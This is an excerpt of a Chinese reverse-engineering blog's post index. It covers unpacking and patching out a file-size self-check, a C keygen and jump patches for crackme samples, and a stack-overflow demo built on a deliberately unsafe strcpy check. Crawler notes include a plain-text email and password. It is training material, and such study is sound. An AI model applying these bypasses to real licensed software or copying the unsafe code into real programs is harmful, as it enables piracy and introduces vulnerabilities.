值为0的地址，后面是字符串的地址减去该地址为5，即为v6,否则的话返回值为-1，在后面的判断中赋值为3.此为v6的具体赋值过程。\n\n![](http://i.imgur.com/IbfwZCz.png)","tags":["逆向"],"categories":["逆向"]},{"title":"Linux虚拟机无法开机","url":"/2017/07/22/杂学/拯救我的虚拟机/","content":"具体描述：由于物理磁盘空间不够，而虚拟机系统越来越大，最终导致ubuntu系统无法开机。\n\n尝试方法1：找到虚拟机设置->选项->快照->恢复到快照。这个方法可以回到关机前的状态，这是你去删掉一些大文件，然后重新分配磁盘就可以了。![](http://i.imgur.com/JYajVBB.png)\n\n尝试方法2：另外新建一个虚拟机系统ubuntu,然后设置->硬盘->添加->硬盘->选择现有虚拟磁盘，然后找到你无法开机的虚拟机系统文件，确定然后开机。然后把你所需要的文件拷贝出来。然后我也删了一些东西，但是发现磁盘空间占用并没有缩小。所以此方法也只能用于拷贝重要资料而用。\n","tags":["杂学"],"categories":["杂学"]},{"title":"搭建虚拟网络环境inetsim","url":"/2017/07/22/逆向/inetsim/","content":" 主要步骤详见\n\n\n1.inetsim 安装详见http://www.inetsim.org/packages.html\n\n2.inetsim 配置详见http://www.cnblogs.com/hyq20135317/p/5515675.html","tags":["逆向"],"categories":["逆向"]},{"title":"esp脱壳+文件大小自校验","url":"/2017/07/15/逆向/esp脱壳+文件大小自校验/","content":"### 步骤如下\n\n1.查壳\n由图可见，显然有壳\n\n![](http://i.imgur.com/56OEUZ6.png)\n\n2.找oep(ESP定律)\n\n程序加载进OD，F8单步运行，右边寄存器窗口发现只有esp的值在变，符合ESP定律。\n在寄存器位置右键，点击HW-break下硬件断点。然后F9运行到断点处，到达跳转到oep 的前一步，单步运行，遇到如下图：右键分析点击在模块中删除分析，即得到OEP.在oep处右键用ollydump脱壳当前进程。复制当前oep.\n\n![](http://i.imgur.com/7VfQh3T.png)\n![](http://i.imgur.com/CaYz7wj.png)\n\n3.脱壳(LordPE)\n\n在lordPE中打开样本程序，选中右键纠正镜像大小，再右键完全脱壳。\n![](http://i.imgur.com/o84YxcW.png)\n\n4.修复导入表(ImportREC)\n\n 在ImportREC中打开目标进程即样本进程，然后右边选项中输入之前在OD中选中的OEP，点击IAT自动搜索，然后点击获取导入表。\n\n![](http://i.imgur.com/Ah6wEjD.png)\n\n5.文件大小自检\n\n脱壳以后双击没得反应，可能是有文件大小自检校验，脱壳后的程序载入OD，在GetFileSize函数下断点，在插件中选API断点设置工具->常用API断点。选中文件类的GetFileSize.然后F9运行程序，到断点处停下，在堆栈中右键反汇编跟随，找到调用这个函数的位置，然后下断点，把刚刚的那个断点删除。在断点后发现是几个cmp ,很明显是比较文件大小，故而把这两个ｃｍｐ右键二进制－＞用ｎｏｐ填充。然后复制到可执行文件，保存文件。再次点击程序，发现正常运行。\n![](http://i.imgur.com/3X4dGg6.png)\n\n![](http://i.imgur.com/nIXhd5Y.png)\n\n![](http://i.imgur.com/UEFRdvd.png)\n\n**\n注：esp 定律**\n\n\nESP定律算是我们在脱壳当中最常使用的方法之一，也特别适合像我一样的新手！而今天文章说的是ESP脱壳的原理和分析！只有知道原理了，我们的技术才能走得列远！\n\n\n一.准备知识\n在我们开始讨论ESP定律之前，我先给你讲解一下一些简单的汇编知识。\n\n\n1.call\n\n这个命令是访问子程序的一个汇编基本指令。也许你说，这个我早就知道了！别急请继续看完。call真正的意义是什么呢？我们可以这样来理解：\n\n1.向堆栈中压入下一行程序的地址；\n2.JMP到call的子程序地址处。\n\n例如：\n\n代码:\n\n00401029.E8 DA240A00 call 004A3508\n0040102E.5A pop edx\n\n在执行了00401029以后，程序会将0040102E压入堆栈，然后JMP到004A3508地址处！\n\n\n\n2.RETN\n\n与call对应的就是RETN了。对于RETN我们可以这样来理解：\n\n1.将当前的ESP中指向的地址出栈；\n\n2.JMP到这个地址。\n\n这个就完成了一次调用子程序的过程。在这里关键的地方是：如果我们要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RETN这条指令之前，ESP指向的是我们压入栈中的地址。这也就是著名的“堆栈平衡”原理！\n\n\n3.狭义ESP定律\n\nESP定律的原理就是“堆栈平衡”原理。\n\n让我们来到程序的入口处看看吧！\n\n1.这个是加了ASPACK壳的入口时各个寄存器的值！\n\n代码:\n\nEAX 00000000\n\nECX 0012FFB0\n\nEDX 7FFE0304 //堆栈值\n\nEBX 7FFDF000 //堆栈值\n\nESP 0012FFC4\n\nEBP 0012FFF0\n\nESI 77F57D70 ntdll.77F57D70\n\nEDI 77F944A8 ntdll.77F944A8\n\nEIP 0040D000 ASPACK.<ModuleEntryPoint>\n\n2.这个是ASPACK壳JMP到OEP后的寄存器的值！\n\n代码:\n\nEAX 004010CC ASPACK.004010CC\n\nECX 0012FFB0\n\nEDX 7FFE0304 //堆栈值\n\nEBX 7FFDF000 //堆栈值\n\nESP 0012FFC4\n\nEBP 0012FFF0\n\nESI 77F57D70 ntdll.77F57D70\n\nEDI 77F944A8 ntdll.77F944A8\n\nEIP 004010CC ASPACK.004010CC\n\n呵呵~是不是除了EIP不同以外，eax保存当前OEP值，其他都一模一样啊！\n\n为什么会这样呢？我们来看看\n\n\n0040D000 A> 60 pushad //注意这里ESP=0012FFC4\n\n0040D001 E8 00000000 call ASPACK.0040D006 //ESP=0012FFA4\n\nPUSHAD就是把所有寄存器压栈！我们在到壳的最后看看：\n\n代码:\n\n0040D558 61 popad //ESP=0012FFA4\n\n0040D559 75 08 jnz short ASPACK.0040D563 //注意这里ESP=0012FFC4\n\n也就是说当我们对ESP的0012FFA4下硬件访问断点之后。当程序要通过堆栈访问这些值，从而恢复原来寄存器的值，准备跳向苦苦寻觅的OEP的时候，OD帮助我们中断下来。\n\n\n\n小结：我们可以把壳假设为一个子程序，当壳把代码解压前和解压后，他必须要做的是遵循堆栈平衡的原理。\n\n因为大家对ESP理解各有异同，但是，大同小异！一般理解可以为：\n\n1、在命令行下断hr esp-4（此时的ESP就是OD载入后当前显示的值）\n\n2、hr ESP(关键标志下一行代码所指示的ESP值(单步通过)) \n\n","tags":["逆向"],"categories":["逆向"]},{"title":"第一次注册机","url":"/2017/07/12/逆向/第一次编写注册机/","content":"\n#### 步骤如下\n\n1、破解样本 链接为 http://pan.baidu.com/s/1miA38A8\n\n2、首先打开样本程序，得到关键字符串“Incorrect!!,Try Again”，如下\n![](http://i.imgur.com/kQ9YJPI.png)\n\n3、打开IDA加载该样本程序。打开View->Open Subviws->Strings 字符串窗口，搜索关键字符串,得到关键字符串\"Correct way to go,You Got It\".点击找到数据段的定义位置，按下Ctrl+x 找到它的引用位置，然后按下tab键，找到反编译的结果。\n\n![](http://i.imgur.com/H0wjDEh.png)\n![](http://i.imgur.com/eLlL0cI.png)\n\n分析反编译的c程序，发现其首先进行字符串长度的比较，然后把字符串和一个常数进行了一系列的操作。\n\n4、打开od,载入程序定位到关键字符串的位置（在IDA中有具体地址），直接ctrl+G输入地址可以直接定位字符串位置，然后向上查找关键跳转，找到一个JNZ。。。。，直接断点，\n![](http://i.imgur.com/SGROWMU.png)\n看下结果。然后发现跳转实现的话，直接后面单步执行，会弹出“Incorrect!!,Try Again”。尝试把跳转给改了，然后保存到文件，此时再随意输入，发现弹出“correct way to go”、\n![](http://i.imgur.com/COHLpMa.png)\n\n5、下面分析其算法逻辑。\nJNZ 前面的call下断点，单步进入发现是一个字符串你的比较，一个字符串是我们输入的第二个字，另一个是一个长字符串，猜测应该是第一个字符串经过一系列运算所得。向上分析，查找算法：找到GetDlgItemTextA_3097，为获取输入的字符串，然后后面是字符串长度的比较。![](http://i.imgur.com/ougupiX.png) \n\n\n再后面就是其具体的算法了：\n\n![](http://i.imgur.com/37qWSuL.png)\n\n用c代码来表示就是：\n\n\t#include<stdio.h>\n\t#include<string.h>\n\tint main()\n\t{\n\t\tchar name[200];\n\t\tchar key[100] = { 0 };  \n\t\tint nlen,i;   // int 4个字节 \n\t\tint start;\n\t\t//int len=5;\n\t\tstart=0x81276345;\n\t\tscanf(\"%s\", name);\n\t\tnlen = strlen(name);\n\t\tif(nlen>=5)\n\t\t{\n\t\t\t//printf(\"%s\", name);\n\t\t\t//printf(\"%c\", name[0]);\n\t\t\tfor(i=0;i<nlen;i++)\n\t\t\t{\n\t\t\t\tstart=start+name[i];\n\t\t\t\t//i=i<<8;\n\t\t\t\t//printf(\"%x\\n\",i);\n\t\t\t\tstart=start^(i<<8);\n\t\t\t\t//j=i+1;\n\t\t\t\t//tmp=len*i;\n\t\t\t\t//tmp=~tmp;\n\t\t\t\t//j=j*tmp;\n\t\t\t\tstart=start*(i+1)*(~(nlen*i));\n\t\t\t\t//printf(\"%x\\n\",start);\n\t\t\t}\n\t\t\tprintf(\"%1u\\n\",start);  //u 代表无符号整数\n\t\t\tsystem(\"pause\");\n\t\t}\n\t\telse\n\t\t{\n\t\t\tprintf(\"序列号不能少于5位\\n\");\n\t\t\tsystem(\"pause\");\n\t\t}\n\t\treturn 0;\n\t}\n\n输入任意大于等于5位的字符串，得到的结果就是其序列号。如\n![](http://i.imgur.com/fGIngFo.png)\n![](http://i.imgur.com/jaGjvKJ.png)","tags":["逆向"],"categories":["逆向"]},{"title":"栈基础知识","url":"/2017/07/10/逆向/栈基础知识/","content":"\n\n### 1.C语言变量的分布 ：\nC 语言有全局变量(Global)、本地变量(Local)，静态变量(Static)、寄存器变量(Regeister)。每种变量都有不同的分配方式。先来看下面这段代码： \n\n\t#include <stdio.h> \n\tint g1=0, g2=0, g3=0; \n\tint main() \n\t{ \n\tstatic int s1=0, s2=0, s3=0; \n\tint v1=0, v2=0, v3=0; \n\t\n\t//打印出各个变量的内存地址 \n\t\n\tprintf(\"0x%08x\\n\",&v1); //打印各本地变量的内存地址 \n\tprintf(\"0x%08x\\n\",&v2); \n\tprintf(\"0x%08x\\n\\n\",&v3); \n\tprintf(\"0x%08x\\n\",&g1); //打印各全局变量的内存地址 \n\tprintf(\"0x%08x\\n\",&g2); \n\tprintf(\"0x%08x\\n\\n\",&g3); \n\tprintf(\"0x%08x\\n\",&s1); //打印各静态变量的内存地址 \n\tprintf(\"0x%08x\\n\",&s2); \n\tprintf(\"0x%08x\\n\\n\",&s3); \n\tsystem(\"pause\");\n\treturn 0; \n\t} \n\n可以看出本地变量和全局/静态变量的分布完全不同，相差甚远，这是因为他们分布在不同类型的区域。\n进程的内存空间分为：代码区，静态数据区和动态数据区。全局和静态变量分配在静态数据区，本地变量分配在动态数据区，即”堆栈“，\n![](http://i.imgur.com/Pbbtyit.png)\n\n\n\n### 2. 栈的存储\n\n\n\t\t#include <stdio.h> \n\t\tvoid __stdcall func(int param1,int param2,int param3) \n\t\t{ \n\t\tint var1=param1; \n\t\tint var2=param2; \n\t\tint var3=param3; \n\t\tprintf(\"0x%08x\\n\",&parameter1); //打印出各个变量的内存地址 \n\t\tprintf(\"0x%08x\\n\",&parameter2); \n\t\tprintf(\"0x%08x\\n\\n\",&parameter3); \n\t\tprintf(\"0x%08x\\n\",&var1); \n\t\tprintf(\"0x%08x\\n\",&var2); \n\t\tprintf(\"0x%08x\\n\\n\",&var3); \n\t\treturn; \n\t\t} \n\t\tint main() \n\t\t{ \n\t\tfunc(1,2,3); \n\t\treturn 0; \n\t\t} \n\n![](http://i.imgur.com/kFjeO8n.png)\n\n函数的参数是从右向左传递，即先压栈parameter 3，然后parameter 2，最后才是parameter 1，然后是函数的返回地址，然后就是本地变量var1，var2,var3\n\n\n### 3.程序进入main()函数 ，栈帧的保存和关闭\n\n\n例如：\n\n\tint main（）\n\t{\n\treturn0；\n\t}\n\t汇编代码为：\n\tpush ebp;   保存进入main()函数时其他初始化函数的栈底\n\tmove ebp,esp; 把当前esp的值作为栈底\n\tsub esp ,40h 开辟栈空间，作为局部变量的存储空间\n\tpush ebx\n\tpush  esi\n\tpush  edi  保存寄存器的值\n\tLEA edi ,[ebp-40h]  取出此函数可用栈空间首地址  \n\tmov ecx,10h            设置ecx寄存器的值\n\tmov eax ,occcccccch  把局部变量初始化为0xcccccccch\n\trep stos  dword ptr [edi]   根据ecx的值，把eax的内容，以四字节为单位写到edi指向的内存\n\txor eax,eax    设置返回值为0\n\tpop  edi  \n\tpop esi\n\tpop ebx   弹出压入寄存器的值\n\tadd esp,40h  降低esp,局部空间释放\n\tcmp ebp,esp 检查栈平衡\n\tcall _chkesp()  进入栈错误检查函数\n\tmov esp.ebp  还原esp\n\tpop ebp         还原ebp\n\tret\n\n\n### 4.  简单的分配栈帧及溢出修改相邻变量\n\n\n例如：\n\n\t\t#include <windows.h>\n\t\t \n\t\t#define PASSWORD \"1234567\"\n\t\t \n\t\tint verify_password(char *password){\n\t\t\tint authenticated;\n\t\t\tchar buffer[8];\n\t\t\tauthenticated = strcmp(password,PASSWORD);\n\t\t\tstrcpy(buffer,password);\n\t\t\treturn authenticated;\n\t\t}\n\t\t \n\t\tint main(int argc, char* argv[])\n\t\t{\n\t\t\tint valid_flag = 0;\n\t\t\tchar password[1024];\n\t\t\tFILE *fp;\n\t\t\tif (!(fp=fopen(\"password.txt\",\"rw+\"))){\n\t\t\t\treturn 0;\n\t\t\t}\n\t\t\tfscanf(fp,\"%s\",password);\n\t\t\tvalid_flag = verify_password(password);\n\t\t\tif(valid_flag){\n\t\t\t\tprintf(\"incorrect password!\\n\");\n\t\t\t}else{\n\t\t\t\tprintf(\"Congratulation! You have passed the verification !\\n\");\n\t\t\t}\n\t\t\tSleep(-1);\n\t\t\treturn 1;\n\t\t}\n\n用OD调试：\n进入main()主函数，找到验证密码的函数调用位置，进入到函数具体代码处：\n![](http://i.imgur.com/jNcKasB.png)\n![](http://i.imgur.com/pQm0oAL.png)\n![](http://i.imgur.com/qBPQTjK.png)\n\n前面部分就是栈分配局部变量空间和初始化的过程，然后就是字符串的计较，最后是字符串的复制，分析可得栈溢出在这一部分，在指令008D1409处把函数的返回值（EAX储存的是返回值）存在了EBP-0XC处，下面就是strocpy的操作，char buffer[8]分配了八个字节的存储空间，但是password.txt的密码如图为24个字节，知错执行strcpy的时候，把buffer 附近的变量空间也给覆盖了，比如返回值的。以上过程如图所示\n![](http://i.imgur.com/9CBEnex.png)\n![](http://i.imgur.com/S0M3SMC.png)\n![](http://i.imgur.com/S0ptRZH.png)","tags":["逆向"],"categories":["逆向"]},{"title":"win10添加右键菜单","url":"/2017/07/06/杂学/右键菜单/","content":"\n\n\n1.win +R 打开运行窗口，输入regedit，进入注册表。\n\n2.打开HKEY_CLASSES_ROOT\\*\\shell，右键新建项，输入项名，比如sublime，点击默认输入数值数据为你的程序名比如sublime。\n\n3.点击新建项sublime,右键新建项，命名为command,必须为这个名字，然后点击默认，在数值数据那里输入你要添加的程序路径，比如我的sublime 为\"E:\\Sublime Text 3\\sublime_text.exe\" \"%1\" \n确定即可。\n ![](http://i.imgur.com/nQzB0OO.png)\n\n后续：\n邮件发送到菜单\n\n1.运行  shell:sendto\n\n2.新建你要添加到发送到的程序快捷方式即可\n","tags":["杂学"],"categories":["杂学"]},{"title":"简单爬虫","url":"/2017/07/06/编程/spider/","content":"\n-*- coding: utf-8 -*-    #可解决诸多编码问题，建议程序加上\n\n\t# import urllib2\n\t# import urllib\n\n### 1 .直接传输数据。利用urllib2\n\n\t# response =urllib2.urlopen('http://www.baidu.com')\n\t# print response.read()\n\t#首先建立一个request实例，可以在构建请求的时候加入其他内容，比如data和header\n\t#request=urllib2.request(url)\n\t#response=urllib2.urlopen(request)\n\t#print response.read()\n\n### 2.post方式传递数据和get方式\n\n\t# post方式传送数据\n\t# values={'username':'1265616844@qq.com','password':'scu123456'}\n\t# data=urllib.urlencode(values)\n\t# request=urllib2.request('http://www.baidu.com',data)\n\t# response=urllib2.urlopen(request)\n\t# print response.read()\n\t#get方式出传送数据\n\t# values={'username':'1265616844@qq.com','password':'scu123456'}\n\t# data=urllib.urlencode(values)\n\t# url=\"http://www.baidu.com\"+\"?\"+data\n\t# request=urllib2.request(url)\n\t# response=urllib2.urlopen(request)\n\t# print response.read()\n\n### 3 .模拟登陆\n\n\t# 构建request实例的时候，加入header模拟登陆\n\t# values={'username':'1265616844@qq.com','password':'scu123456'}\n\t# data=urllib.urlencode(values)\n\t# headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36','Referer':'https://www.baidu.com/link?url=E3phPx1eObXAfu4bCGSc2YVs58W76-YCXkEtiAN51lC&wd=&eqid=8815b85d0006fca2000000035915d702'}\n\t# request=urllib2.request('http://www.baidu.com',data,headers)\n\t# response=urllib2.urlopen(request)\n\t# print response.read()\n\n### 4.设置代理服务器\n\n\t# 设置代理服务器解决ip频繁访问被封问题\n\t# import urllib2\n\t# enable_proxy=True\n\t# proxy_handler=urllib2.ProxyHander({\"http\":'http://some-proxy.com:8080'})\n\t# null_proxy_handler=urllib2.build_opener(proxy_handler)\n\t# if enable_proxy:\n\t#   opener=urllib2.build_opener(proxy_handler)\n\t# else:\n\t#   opener=urllib2.build_opener(null_proxy_handler)\n\t#urllib2.install_opener(opener)\n\t#\n\n### 5.捕获url异常的写法\n\n\t#\n\t# import urllib2\n\t# request = urllib2.Request('http://www.baidu')\n\t# try:\n\t#     print urllib2.urlopen(request).read()\n\t# except urllib2.URLError, e:\n\t#     print e.reason\n\t#\n\n### 6.捕获httperror 的写法\n\n\t# import urllib2\n\t# req=urllib2.Request(\"http://blog.csdn.net/cqcre\")\n\t# try:\n\t#     print urllib2.urlopen(req)\n\t# except urllib2.HTTPError,e:\n\t#     print e.code\n\t#     print e.reason\n\t# except urllib2.URLError,e:\n\t#     print e.reason\n\t#requires 库的使用\n\t# import requests\n\t# s = requests.session()\n\t# s.headers.update({'x-test': 'true'})\n\t# r = s.get('http://httpbin.org/headers', headers={'x-test2': 'true'})\n\t# print r.text\n\n ### 7.正则匹配\n\n\tExample 1\n\t# import re\n\t# a='ba91c'\n\t# pattern=re.compile(r\"a\\d{1,2}c\")\n\t# if  re.match(pattern,a):  #开头必须匹配\n\t#     print 'success'\n\t# if re.search(pattern,a):  #开头不要求匹配\n\t#     print 'research success '\n\t# pattern=re.compile(r\"\\d+\")\n\t# print re.split(pattern,a)\n\t# print re.findall(pattern,a)\n\tExample 2\n\t# import urllib\n\t# import json\n\t# import urllib2\n\t# import re\n\t# from bs4 import BeautifulSoup\n\t# page=1\n\t# url = 'http://www.qiushibaike.com/hot/page/' + str(page)\n\t# headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}\n\t# try:\n\t# \treq=urllib2.Request(url,headers=headers)\n\t# \tresponse=urllib2.urlopen(req)\n\t# \tprint response.code\n\t# \tcontent=response.read().decode('utf-8')\n\t# \tpattern = re.compile(r'<a href=.*? target=.*? title=.*?>.*?<h2>(.*?)</h2>.*?<span>(.*?)</span>.*?<i class=\"number\">(.*?)</i>', re.S)\n\t# \titems=re.findall(pattern,content)\n\t# \tfor item in items:\n\t# \t\tprint json.dumps(item[0], encoding=\"UTF-8\", ensure_ascii=False),json.dumps(item[1], encoding=\"UTF-8\", ensure_ascii=False),json.dumps(item[2], encoding=\"UTF-8\", ensure_ascii=False)\n\t# except urllib2.URLError,e:\n\t# \tif hasattr(e,\"code\"):\n\t# \t\tprint e.code\n\t# \tif hasattr(e,\"reason\"):\n\t# \t\tprint e.reason\n\n### 8.时间戳\n\n\t# from datetime import datetime\n\t# import time\n\t# a =datetime.now()\n\t# #sleep(10)\n\t# time.sleep(10)\n\t# b=datetime.now()\n\t# print (b-a).seconds\n\n### 9.beautifulsoup 的学习\n\n\t# from bs4 import BeautifulSoup\n\t# html = \"\"\"\n\t# <html><head><title>The Dormouse's story</title></head>\n\t# <body>\n\t# <p class=\"title\" name=\"dromouse\"><b>The Dormouse's story</b></p>\n\t# <p class=\"story\">Once upon a time there were three little sisters; and their names were\n\t# <a href=\"http://example.com/elsie\" class=\"sister\" id=\"link1\"><!-- Elsie --></a>,\n\t# <a href=\"http://example.com/lacie\" class=\"sister\" id=\"link2\">Lacie</a> and\n\t# <a href=\"http://example.com/tillie\" class=\"sister\" id=\"link3\">Tillie</a>;\n\t# and they lived at the bottom of a well.</p>\n\t# <p class=\"story\">...</p>\n\t# \"\"\"\n\t# soup=BeautifulSoup(html,'lxml')\n\t# for p in soup.p.next_siblings :  #同级兄弟节点\n\t#     print p\n\t\n\t# print soup.prettify()\n\t# print soup.title\n\t# print soup.title.string\n\t# for string in  soup.body.stripped_strings:\n\t# \tprint string\n\t# print soup.a\n\t# print soup.a.string\n\t# print soup.head.contents\n\t# for children in  soup.head.children:\n\t# \tprint children\n\t\n\t#soup.findall()\n\t#还可以传入关键词如果一个指定名字的参数不是搜索内置的参数名,\n\t#搜索时会把该参数当作指定名字tag的属性来搜索,例如如果包含一\n\t#个名字为 id 的参数,Beautiful Soup会搜索每个tag的”id”属性\n\t#for examle  soup.findall(id=\"link2\") or soup.findall(href=re.compile('elsie')\n\t#print soup.find_all(attrs={\"name\": \"dromouse\"})\n\t#soup.select()\n\t# print soup.select('title')  #通过标签名\n\t# print soup.select('.story') #通过类名\n\t# print soup.select(\"#link1\") #通过id\n\t# print soup.select(\"p #link1\") #标签名和id 的组合\n\t# print soup.select('a[class=\"sister\"]')#标签和类\n\n### 10.selenium测试  \n\n\t# -*- coding: utf-8 -*-  \n\t# from selenium import webdriver\n\t# browser=webdriver.Chrome()\n\t# browser.get('http://www.baidu.com/')\n\t# import sys\n\t# reload(sys)\n\t# sys.setdefaultencoding('utf-8')\n\t# from selenium import webdriver\n\t# from selenium.webdriver.common.keys import Keys\n\t#\n\t# driver = webdriver.Chrome()\n\t# driver.get(\"http://www.python.org\")\n\t# assert \"Python\" in driver.title\n\t# elem = driver.find_element_by_name(\"q\")\n\t# elem.send_keys(\"pycon\")\n\t# elem.send_keys(Keys.RETURN)\n\t# print driver.page_source\n\n### 11.  selenium 优化\n\n以登陆腾讯哈勃分析系统为例\n\n主要的优化在于把time.sleep()这种强制等待多少秒换成隐式等待和显式等待。\n所谓隐式等待就是\ndriver.implicitly_wait(30) 设置最大超时时间为30秒，当页面加载完毕以后，要查找的元素找到即进行下一步，而不必强行等待多少秒，所谓的显式等待就是等你所要查找的元素出现后进行下一步，WebDriverWait(driver, 60).until(EC.presence_of_element_located(locator))  。\n\n\t# -*- coding: utf-8 -*-\n\t# 登陆腾讯哈勃分析系统\n\timport time\n\timport json\n\tfrom selenium import webdriver\n\tfrom selenium.webdriver.support.wait import WebDriverWait\n\tfrom selenium.webdriver.support import expected_conditions as EC\n\tfrom selenium.webdriver.common.by import By\n\tdriver = webdriver.Chrome()\n\ttime.sleep(3)\n\tdriver.get('https://habo.qq.com/')\n\t#time.sleep(3)\n\tdriver.implicitly_wait(30)\n\t#driver.implicitly_wait(30)\n\tdriver.find_element_by_id(\"nologin\").click()\n\t# time.sleep(5)\n\t#driver.implicitly_wait(30)\n\tdriver.switch_to_frame('login_ifr')\n\t# print driver.page_source.encode('utf-8')\n\tdriver.find_element_by_css_selector(\"#img_out_1031652154\").click()\n\t# time.sleep(3)\n\t#driver.implicitly_wait(30)\n\tfor i in range(1200,1300):\n\t    filename='F:\\\\sample_malware\\\\1\\\\pdf\\\\'+str(i)+'.pdf'\n\t    driver.find_element_by_css_selector(\"#file_upload2\").send_keys(filename)\n\t    #time.sleep(15)\n\t    #driver.implicitly_wait(30)\n\t    time.sleep(3)\n\t    print 'pdf'+str(i)\n\t    # try:\n\t    #     driver.find_element_by_id('file_upload_fail')\n\t    #     a = True\n\t    # except:\n\t    #     a = False\n\t    # if a == False:\n\t    \t#time.sleep(6)\n\t    locator=(By.ID,\"detail_frame\")\n\t    # driver.implicitly_wait(30)\n\t    #driver.find_element_by_xpath(\".//*[@id='detail_frame']/div[1]/div/div[1]/div[1]\")\n\t    try:\n\t    \tWebDriverWait(driver, 60).until(EC.presence_of_element_located(locator))\n\t    \tdriver.back()\n\t    except:\n\t    \tdriver.refresh()\n\t    \n\t    # else:\n\t    # \tpass\n\t    #     #driver.refresh()\n\n遇到的问题：\n\n注意:\nFrame/Iframe原因定位不到元素：\n\n1.这个是最常见的原因，首先要理解下frame的实质，frame中实际上是嵌入了另一个页面，而webdriver每次只能在一个页面识别，因此需要先定位到相应的frame，对那个页面里的元素进行定位。 例如：如果iframe有name或id的话，直接使用switch_to_frame(\"name值\")或switch_to_frame(\"id值\")。如下：\n\n\tdriver=webdriver.Firefox()\n\tdriver.get(r'http://www.126.com/')\n\tdriver.switch_to_frame('x-URS-iframe')  #需先跳转到iframe框架\n\tusername=driver.find_element_by_name('email')\n\tusername.clear()\n\n如果iframe没有name或id的话，则可以通过下面的方式定位：\n\n\t#先定位到iframe\n\telementi= driver.find_element_by_class_name('APP-editor-iframe')\n\t#再将定位对象传给switch_to_frame()方法\n\tdriver.switch_to_frame(elementi) \n\n如果完成操作后，可以通过switch_to.parent_content()方法跳出当前iframe，或者还可以通过switch_to.default_content()方法跳回最外层的页面\n\n2.关于窗口的切换用到switch_to_window(handle)  方法\n\n例如：\n\n    all_handles = driver.window_handles #获取所有窗口句柄\n    for handle in all_handles:\n        if handle != now_handle:\n            print handle    #输出待选择的窗口句柄\n            driver.switch_to_window(handle)\n            time.sleep(5)\n            try:\n                filename=driver.find_element_by_xpath(\".//*[@id='baseinfo']/div/table/tbody/tr[1]/td[2]/p\").text+\".html\"\n                with open(filename, 'w') as fp:\n                    fp.write(driver.page_source.encode('utf-8'))\n            except:\n                print str(j)+str(i)\n            time.sleep(5)\n            driver.close() #关闭当前窗口\n    time.sleep(3)\n    print now_handle   #输出主窗口句柄\n    driver.switch_to_window(now_handle) #返回主窗口\n    time.sleep(5)\n\n\n\n### 12.requires库的使用\n\n两种模拟登陆的方式：\n\n1. 构建请求的表单数据来登录\n\n\t\t# -*- coding: utf-8 -*-\n\t\t# import requests\n\t\t# import ConfigParser\n\t\t# import json\n\t\t# cf = ConfigParser.ConfigParser()\n\t\t# cf.read('config.ini')\n\t\t# username = cf.get('info', 'username')\n\t\t# password = cf.get('info', 'password')\n\t\t# csrfmiddlewaretoken=cf.get('info','csrfmiddlewaretoken')\n\t\t# ##g-recaptcha-response=cf.get('info','g-recaptcha-response')\n\t\t# session = requests.session()\n\t\t# login_data = {'username': username, 'password': password,'csrfmiddlewaretoken':csrfmiddlewaretoken,'g-recaptcha-response':cf.get('info','g-recaptcha-response')}\n\t\t# header = {\n\t\t#     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36',\n\t\t#     'Host': 'malwr.com',\n\t\t#     'Referer': 'https://malwr.com/account/login/'\n\t\t# }\n\t\t# # r = session.get('http://malwr.com/')  # 实现验证码登陆\n\t\t# r = session.post('https://malwr.com/account/login/', data=login_data, headers=header)\n\t\t\n\t\t# with open('123.html', 'w') as fp:\n\t\t#     fp.write(r.content)\n\n\n2. 构建cookies来模拟登陆\n3. \n\t\t# -*- coding: utf-8 -*-\n\t\timport requests\n\t\timport ConfigParser\n\t\timport json\n\t\tcf = ConfigParser.ConfigParser()\n\t\tcf.read('config.ini')\n\t\tcookies = cf.items('cookies')\n\t\tcookies = dict(cookies)\n\t\theader = {\n\t\t    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',\n\t\t    'Host': 'malwr.com',\n\t\t    'Referer': 'https://malwr.com/account/login/'\n\t\t}\n\t\tsession = requests.session()\n\t\tr = session.get('http://malwr.com/analysis/', cookies=cookies,headers=header)  # 实现验证码登陆\n\t\t\n\t\twith open('login.html', 'w') as fp:\n\t\t    fp.write(r.content)\n","tags":["编程"],"categories":["编程"]},{"title":"破解实例2","url":"/2017/07/06/逆向/破解实例2/","content":"\n一、样本基本信息\n\n破解样本 链接为 http://pan.baidu.com/s/1o8lwLiq\n\n二、分析过程\n\n首先打开样本程序，得到关键字符串“try again”，如下\n![](http://i.imgur.com/ihhEPri.png)\n\n打开IDA加载该样本程序。打开View->Open Subviws->Strings 字符串窗口，搜索关键字符串。\n\n ![](http://i.imgur.com/flE7THU.png)\n\n双击字符串，进入IDA-View 窗口，按table键转换为Pseudocode 窗口，这是反编译过来的c代码，观察它的逻辑。找到判断，跳转的位置。如图 可以看出调用了istrcmpA函数，比较输入字符串和要找的字符串，然后跳转。在这一行 代码处按table键切换窗口找到反汇编位置，如图是代码段0x00401094 的位置。\n\n![](http://i.imgur.com/4u7teoc.png)![](http://i.imgur.com/yf2icp9.png)![](http://i.imgur.com/vzzRbj2.png)\n\n打开OD找到这个位置。\n此时我们在这个位置下断点可以看到，堆栈区显示两个字符串，一个是我们输入的字符串，而另一个就是实际的序列号。\n\n\n![](http://i.imgur.com/epbIVI8.png)![](http://i.imgur.com/OWmZPEz.png)\n有两种方法可以破解，第一种方法是直接输入这个序列号就行了，另一种是我们找到跳转到显示“try again ”的位置，修改跳转指令，步骤如下：\n\n方法1：输入“`mddggzdl” ，显示\"very good\".\n\n\n![](http://i.imgur.com/TMfyDA5.png)\n\n方法2：分析断点附近的指令，单步调试发现跳转指令在指令“0040109A”处 当跳转实现时，跳转到\"success\" ,当跳转没有实现时，跳转到“fail” 。我们只需要修改这个跳转条件，让它的跳转调到\"success\"即可。分析指令我们知道把JE 